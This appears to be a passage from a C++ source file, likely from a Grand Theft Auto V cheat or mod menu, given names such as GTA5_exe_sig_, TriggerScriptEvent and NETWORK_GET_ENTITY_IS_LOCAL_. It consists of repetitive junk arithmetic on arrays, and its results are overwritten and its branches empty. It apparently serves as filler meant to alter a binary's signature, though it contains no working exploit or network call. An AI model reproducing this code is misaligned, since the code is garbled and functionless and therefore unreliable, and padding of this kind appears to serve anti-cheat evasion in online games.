					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
		}
		namespace Float
		{
			int PED_TO_NET_ = 2;
			int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			int offset = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			float a = 0.0f;
			float b = 0.0f;
			int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

			int ponteiro = 2;
			int aaaaaa = ponteiro * 2;
			int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
